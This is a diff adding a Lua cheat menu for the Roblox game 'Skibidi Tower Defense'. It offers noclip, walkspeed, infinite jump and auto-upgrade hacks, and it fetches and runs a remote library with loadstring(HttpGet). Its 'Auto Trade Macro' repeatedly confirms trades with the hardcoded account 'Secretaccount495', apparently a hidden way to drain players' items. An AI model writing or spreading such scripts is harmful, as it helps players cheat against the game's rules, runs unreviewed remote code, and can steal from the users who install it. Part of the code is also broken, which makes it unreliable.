@@ -1,0 +1,191 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+
+local Window = Library.CreateLib("Skibidi Tower Defense | Legend HandlesYT", "BloodTheme")
+
+
+local Tab = Window:NewTab("Main-Features")
+
+
+
+
+
+local Tab1 = Window:NewTab("Settings")
+
+
+
+
+
+local Section = Tab:NewSection("Main-Features")
+
+
+
+local CredSection = Tab1:NewSection("Settings")
+
+
+Section:NewToggle("Auto Trade Macro", "Auto Trade Macro", function(Value)
+   a = Value
+        while a do task.wait(.5)
+        pcall(function()
+   local args = {
+    [1] = game:GetService("Players"):WaitForChild("Secretaccount495")
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ConfirmTrade"):FireServer(unpack(args))
+
+
+   end)
+        end
+end)
+
+Section:NewTextBox("Auto Spawn Troop", "Type Name Of Troop You Wanna Spawn", function(txt)
+	local args = {
+    [1] = (s),
+    [2] = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position),
+    [3] = workspace:WaitForChild("DO NOT DELETE OR PLACE SOMEHWERE ELSE"),
+    [4] = false
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Place"):InvokeServer(unpack(args))
+
+end)
+
+Section:NewToggle("Auto Upgrade Troops", "Auto Upgrades", function(Value)
+   a = Value
+        while a do task.wait(.5)
+pcall(function()
+local cameraNames = {
+    "Camera Man",
+    "Camera Woman",
+    "Celebration Speakerman",
+    "Dark Speaker Man",
+    "Camera Helicopter",
+    "Large Camera Man",
+    "Large Laser Cameraman",
+    "Jetpack Man",
+    "Large TV Man",
+"Large Spotlight Man",
+"Acid Gunner",
+"Balloon Speakerman",
+"Bazooka Helicopter",
+"BemmyBlox",
+"Mace Cameraman",
+"Medic Cameraman",
+"Plunger Cameraman",
+"Sniper",
+"Secret Agent",
+"Potato",
+"Speaker Man",
+"Speaker Woman",
+"Speaker Helicopter",
+"Spider Camera",
+"Spider Speaker",
+"TV Man",
+"TV Woman",
+"Titan TV Man",
+"Titan Speakerman",
+"Titan Reaper",
+"titan Cameraman",
+"Ultimate Titan TV Man",
+"Upgraded Titan Cameraman",
+"Golden Cameraman"
+}
+
+local argsList = {}
+
+for _, name in ipairs(cameraNames) do
+    local camera = workspace:WaitForChild("Units"):WaitForChild(name)
+    table.insert(argsList, camera)
+end
+
+game:GetService("ReplicatedStorage"):WaitForChild("Upgrade"):InvokeServer(unpack(argsList))
+end)
+end
+end)
+
+Section:NewToggle("Noclip", "Go Through Things, Use Infinite Jump With it", function(state) -- 500 (MaxValue) | 0 (MinValue)
+local Noclip = nil
+local Clip = nil
+
+function noclip()
+	Clip = false
+	local function Nocl()
+		if Clip == false and game.Players.LocalPlayer.Character ~= nil then
+			for _,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+				if v:IsA('BasePart') and v.CanCollide and v.Name ~= floatName then
+					v.CanCollide = false
+				end
+			end
+		end
+		wait(0.21) -- basic optimization
+	end
+	Noclip = game:GetService('RunService').Stepped:Connect(Nocl)
+end
+
+function clip()
+	if Noclip then Noclip:Disconnect() end
+	Clip = true
+end
+
+noclip() -- to toggle noclip() and clip()
+end)
+Section:NewToggle("Free Camera", "Zoom Out", function(state) -- 500 (MaxValue) | 0 (MinValue)
+  local LocalPlayer = game:GetService("Players").LocalPlayer
+		LocalPlayer.CameraMaxZoomDistance = 9e9
+		LocalPlayer.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam
+end)
+
+
+
+Section:NewSlider("Walkspeed", "Speed", 300, 16, function(s) -- 500 (MaxValue) | 0 (MinValue)
+    getgenv().WalkSpeedValue = (s); --set your desired walkspeed here
+
+local Player = game:service'Players'.LocalPlayer;
+
+Player.Character.Humanoid:GetPropertyChangedSignal'WalkSpeed':Connect(function()
+
+Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
+
+end)
+
+
+Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
+end)
+
+
+Section:NewToggle("Infinite Jump", "Infinite Jump", function(state)
+
+ if state then
+_G.infinjump = true
+local Player = game:GetService("Players").LocalPlayer
+local Mouse = Player:GetMouse()
+Mouse.KeyDown:connect(function(k)
+if _G.infinjump then
+if k:byte() == 32 then
+Humanoid = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+Humanoid:ChangeState("Jumping")
+wait(0.1)
+Humanoid:ChangeState("Seated")
+end
+end
+end)
+local Player = game:GetService("Players").LocalPlayer
+local Mouse = Player:GetMouse()
+    else
+if _G.infinjump == true then
+_G.infinjump = false
+else
+_G.infinjump = true
+end
+end
+            end)
+
+Section:NewSlider("FOV", "Field Of Views", 120, 70, function(s) -- 500 (MaxValue) | 0 (MinValue)
+game:GetService'Workspace'.Camera.FieldOfView = (s)
+end)
+
+CredSection:NewLabel("Made By Legend HandlesYT")
+
+
+CredSection:NewKeybind("Toggle UI", "Toggle The UI", Enum.KeyCode.L, function()
+	Library:ToggleUI()
+end)
